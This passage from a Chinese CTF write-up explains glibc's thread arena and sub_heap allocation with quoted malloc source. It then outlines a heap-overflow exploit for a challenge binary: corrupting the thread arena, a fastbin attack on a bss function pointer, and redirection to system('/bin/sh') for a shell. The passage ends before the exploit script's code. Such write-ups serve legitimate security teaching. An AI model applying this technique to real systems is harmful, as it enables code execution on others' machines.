class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，分析一下一个新分配区的生成函数_int_new_arena。首先调用了new_heap函数来申请新的内存，可以看到，当获得内存后，该内存的第一块是heap_info结构，接下来设置了malloc_state结构和top头。</p><p>至此，一个新的分配区生成完毕。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> mstate</span><br><span class="line">_int_new_arena (<span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  mstate a;</span><br><span class="line">  heap_info *h;</span><br><span class="line">  <span class="keyword">char</span> *ptr;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> misalign;</span><br><span class="line"></span><br><span class="line">  h = new_heap (size + (<span class="keyword">sizeof</span> (*h) + <span class="keyword">sizeof</span> (*a) + MALLOC_ALIGNMENT),</span><br><span class="line">                mp_.top_pad);</span><br><span class="line">  <span class="keyword">if</span> (!h)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe size is too large to fit in a single heap.  So, just try</span></span><br><span class="line"><span class="comment">         to create a minimally-sized arena and let _int_malloc() attempt</span></span><br><span class="line"><span class="comment">         to deal with the large request via mmap_chunk().  */</span></span><br><span class="line">      h = new_heap (<span class="keyword">sizeof</span> (*h) + <span class="keyword">sizeof</span> (*a) + MALLOC_ALIGNMENT, mp_.top_pad);</span><br><span class="line">      <span class="keyword">if</span> (!h)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  a = h-&gt;ar_ptr = (mstate) (h + <span class="number">1</span>);</span><br><span class="line">  malloc_init_state (a);</span><br><span class="line">  a-&gt;attached_threads = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">/*a-&gt;next = NULL;*/</span></span><br><span class="line">  a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size;</span><br><span class="line">  arena_mem += h-&gt;size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set up the top chunk, with proper alignment. */</span></span><br><span class="line">  ptr = (<span class="keyword">char</span> *) (a + <span class="number">1</span>);</span><br><span class="line">  misalign = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunk2mem (ptr) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">  <span class="keyword">if</span> (misalign &gt; <span class="number">0</span>)</span><br><span class="line">    ptr += MALLOC_ALIGNMENT - misalign;</span><br><span class="line">  top (a) = (mchunkptr) ptr;</span><br><span class="line">  set_head (top (a), (((<span class="keyword">char</span> *) h + h-&gt;size) - ptr) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">  LIBC_PROBE (memory_arena_new, <span class="number">2</span>, a, size);</span><br><span class="line">  mstate replaced_arena = thread_arena;</span><br><span class="line">  thread_arena = a;</span><br><span class="line">  mutex_init (&amp;a-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;list_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Add the new arena to the global list.  */</span></span><br><span class="line">  a-&gt;next = main_arena.next;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> The barrier is an attempt to synchronize with read access</span></span><br><span class="line"><span class="comment">     in reused_arena, which does not acquire list_lock while</span></span><br><span class="line"><span class="comment">     traversing the list.  */</span></span><br><span class="line">  atomic_write_barrier ();</span><br><span class="line">  main_arena.next = a;</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_unlock (&amp;list_lock);</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;free_list_lock);</span><br><span class="line">  detach_arena (replaced_arena);</span><br><span class="line">  (<span class="keyword">void</span>) mutex_unlock (&amp;free_list_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Lock this arena.  NB: Another thread may have been attached to</span></span><br><span class="line"><span class="comment">     this arena because the arena is now accessible from the</span></span><br><span class="line"><span class="comment">     main_arena.next list and could have been picked by reused_arena.</span></span><br><span class="line"><span class="comment">     This can only happen for the last arena created (before the arena</span></span><br><span class="line"><span class="comment">     limit is reached).  At this point, some arena has to be attached</span></span><br><span class="line"><span class="comment">     to two threads.  We could acquire the arena lock before list_lock</span></span><br><span class="line"><span class="comment">     to make it less likely that reused_arena picks this new arena,</span></span><br><span class="line"><span class="comment">     but this could result in a deadlock with ptmalloc_lock_all.  */</span></span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;a-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后再追踪一下new_heap这个申请内存的函数。全局变量 aligned_heap_area 是上一次调用 mmap 分配内存的结束虚拟地址，并已经按照 HEAP_MAX_SIZE 大小对齐。如果 aligned_heap_area 不为空，尝试从上次映射结束地址开始映射大小为 HEAP_MAX_SIZE 的内存块， 由于全局变量 aligned_heap_area 没有锁保护，可能存在多个线程同时 mmap()函数从 aligned_heap_area 开始映射新的虚拟内存块，操作系统会保证只会有一个线程会成功，其它在同一地址映射新虚拟内存块都会失败。 无论映射是否成功，都将全局变量 aligned_heap_area 设置为 NULL。如果映射成功，但返回的虚拟地址不是按HEAP_MAX_SIZE 大小对齐的，取消该区域的映射，映射失败。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> heap_info *</span><br><span class="line">internal_function</span><br><span class="line">new_heap (<span class="keyword">size_t</span> size, <span class="keyword">size_t</span> top_pad)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> pagesize = GLRO (dl_pagesize);</span><br><span class="line">  <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ul;</span><br><span class="line">  heap_info *h;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size + top_pad &lt; HEAP_MIN_SIZE)</span><br><span class="line">    size = HEAP_MIN_SIZE;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (size + top_pad &lt;= HEAP_MAX_SIZE)</span><br><span class="line">    size += top_pad;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (size &gt; HEAP_MAX_SIZE)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    size = HEAP_MAX_SIZE;</span><br><span class="line">  size = ALIGN_UP (size, pagesize);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* A memory region aligned to a multiple of HEAP_MAX_SIZE is needed.</span></span><br><span class="line"><span class="comment">     No swap space needs to be reserved for the following large</span></span><br><span class="line"><span class="comment">     mapping (on Linux, this is the case for all non-writable mappings</span></span><br><span class="line"><span class="comment">     anyway). */</span></span><br><span class="line">  p2 = MAP_FAILED;</span><br><span class="line">  <span class="keyword">if</span> (aligned_heap_area)</span><br><span class="line">    &#123;</span><br><span class="line">      p2 = (<span class="keyword">char</span> *) MMAP (aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE,</span><br><span class="line">                          MAP_NORESERVE);</span><br><span class="line">      aligned_heap_area = <span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">if</span> (p2 != MAP_FAILED &amp;&amp; ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="number">1</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">          __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">          p2 = MAP_FAILED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (p2 == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">      p1 = (<span class="keyword">char</span> *) MMAP (<span class="number">0</span>, HEAP_MAX_SIZE &lt;&lt; <span class="number">1</span>, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">      <span class="keyword">if</span> (p1 != MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">          p2 = (<span class="keyword">char</span> *) (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) p1 + (HEAP_MAX_SIZE - <span class="number">1</span>))</span><br><span class="line">                         &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>));</span><br><span class="line">          ul = p2 - p1;</span><br><span class="line">          <span class="keyword">if</span> (ul)</span><br><span class="line">            __munmap (p1, ul);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            aligned_heap_area = p2 + HEAP_MAX_SIZE;</span><br><span class="line">          __munmap (p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Try to take the chance that an allocation of only HEAP_MAX_SIZE</span></span><br><span class="line"><span class="comment">             is already aligned. */</span></span><br><span class="line">          p2 = (<span class="keyword">char</span> *) MMAP (<span class="number">0</span>, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">          <span class="keyword">if</span> (p2 == MAP_FAILED)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="number">1</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (__mprotect (p2, size, PROT_READ | PROT_WRITE) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  h = (heap_info *) p2;</span><br><span class="line">  h-&gt;size = size;</span><br><span class="line">  h-&gt;mprotect_size = size;</span><br><span class="line">  LIBC_PROBE (memory_heap_new, <span class="number">2</span>, h, h-&gt;size);</span><br><span class="line">  <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>分配区的补充</p><p>在malloc获取较大内存空间，导致top用尽时，根据需求会扩大top块的容量。而对于非主分配区，扩大top在一定情况下是获得连续内存的，这就显示出了sub_heap的用途。跟踪一下int_malloc函数，在malloc函数的最后，有这样的代码，当申请的内存，top头无法满足时，会对fastbin进行释放操作，当仍无法满足时，会调用sysmalloc进行补充。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">     ...</span><br><span class="line">     <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>追踪sysmalloc代码，代码过长，截取非主分配区部分。当申请的堆小于mmap直接分配阈值，并且分配区是非主分配区时，首先尝试延长原有的heap长度（连续分配）；当长度不满足需求时，会重新分配一块sub_heap，并设置heap_info值，也就是利用mmap随机在内存中申请一块内存，这块内存位于刚刚分配的低地址位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">sysmalloc (INTERNAL_SIZE_T nb, mstate av)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr old_top;              <span class="comment">/* incoming value of av-&gt;top */</span></span><br><span class="line">  INTERNAL_SIZE_T old_size;       <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">char</span> *old_end;                  <span class="comment">/* its end address */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> size;                      <span class="comment">/* arg to first MORECORE or mmap call */</span></span><br><span class="line">  <span class="keyword">char</span> *brk;                      <span class="comment">/* return value from MORECORE */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> correction;                <span class="comment">/* arg to 2nd MORECORE call */</span></span><br><span class="line">  <span class="keyword">char</span> *snd_brk;                  <span class="comment">/* 2nd return val */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">/* unusable bytes at front of new space */</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">/* partial page left at end of new space */</span></span><br><span class="line">  <span class="keyword">char</span> *aligned_brk;              <span class="comment">/* aligned offset into brk */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr p;                    <span class="comment">/* the allocated/returned chunk */</span></span><br><span class="line">  mchunkptr remainder;            <span class="comment">/* remainder from allocation */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;   <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> pagesize = GLRO (dl_pagesize);</span><br><span class="line">  <span class="keyword">bool</span> tried_mmap = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If have mmap, and the request size meets the mmap threshold, and</span></span><br><span class="line"><span class="comment">     the system supports mmap, and there are few enough currently</span></span><br><span class="line"><span class="comment">     allocated mmapped regions, try to directly map this request</span></span><br><span class="line"><span class="comment">     rather than expanding top.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">      heap_info *old_heap, *heap;</span><br><span class="line">      <span class="keyword">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">      old_heap = heap_for_ptr (old_top);</span><br><span class="line">      old_heap_size = old_heap-&gt;size;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">          &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">          arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">          set_head (old_top, (((<span class="keyword">char</span> *) old_heap + old_heap-&gt;size) - (<span class="keyword">char</span> *) old_top)</span><br><span class="line">                    | PREV_INUSE);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Use a newly allocated heap.  */</span></span><br><span class="line">          heap-&gt;ar_ptr = av;</span><br><span class="line">          heap-&gt;prev = old_heap;</span><br><span class="line">          av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">          arena_mem += heap-&gt;size;</span><br><span class="line">          <span class="comment">/* Set up the new top.  */</span></span><br><span class="line">          top (av) = chunk_at_offset (heap, <span class="keyword">sizeof</span> (*heap));</span><br><span class="line">          set_head (top (av), (heap-&gt;size - <span class="keyword">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Setup fencepost and free the old top chunk with a multiple of</span></span><br><span class="line"><span class="comment">             MALLOC_ALIGNMENT in size. */</span></span><br><span class="line">          <span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">             become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">             up, too, although the chunk is marked in use. */</span></span><br><span class="line">          old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">          set_head (chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line">          <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">              set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">              set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">              set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">              _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              set_head (old_top, (old_size + <span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">              set_foot (old_top, (old_size + <span class="number">2</span> * SIZE_SZ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (!tried_mmap)</span><br><span class="line">        <span class="comment">/* We can at least try to use to mmap memory.  */</span></span><br><span class="line">        <span class="keyword">goto</span> try_mmap;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span>     <span class="comment">/* av == main_arena */</span></span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，线程堆的初始化、扩展、sub_heap生成全部完成。</p><p>​</p></li></ol><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目逻辑很简单，主函数什么都没有，只开启了一个线程。</p><p><img src="/img/n1ctf2018/2-1.png" alt=""></p><p>在线程中，实现了用户输入任意大小的堆块、个数进行填充，并且可以对最后一个堆块赋值。</p><p><img src="/img/n1ctf2018/2-3.png" alt=""></p><p><img src="/img/n1ctf2018/2-2.png" alt=""></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞存在于赋值函数中，是一个堆溢出函数，可以溢出和堆块大小等长的堆块。</p><p><img src="/img/n1ctf2018/2-4.png" alt=""></p><p>该程序不存在地址泄露，并且system的地址也已经给出。</p><p>利用方法是利用上述线程堆块分配的知识。</p><ol><li><p>首先将线程第一次分配的非主分配区填充满</p></li><li><p>再次申请时，线程只能申请一个新的sub_heap，此时的sub_heap地址位于第一次申请的sub_heap低地址位置。</p></li><li><p>再次将该sub_heap填充满，在最后一次填充时进行复制，由于存在堆溢出，则可以溢出覆盖非主分配区的malloc_state结构体（thread arena），此时的利用和覆盖了main_arena的利用方法一致。</p></li><li><p>选择fastbin attack的方法进行攻击，将fastbin劫持到bss段上去，因为bss段上有一个函数指针，会在赋值后调用，将这个函数赋值为system，并将堆块起始覆盖为’/bin/sh’即可获得shell。</p><p><strong>hint：</strong></p><ol><li><p>一定要劫持大小为0x70的fastbin链，因为可以利用bss段起始位置的STDIO file指针。</p><p>，与第一题的利用相同，都是0x7f。</p></li><li><p>无法劫持top值达到任意分配，原因是无法过int_malloc最后的检测，感兴趣的同学可以踩踩这个坑。</p></li></ol><p>​</p></li></ol><h2 id="解题脚本-1"><a href="#解题脚本-1" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 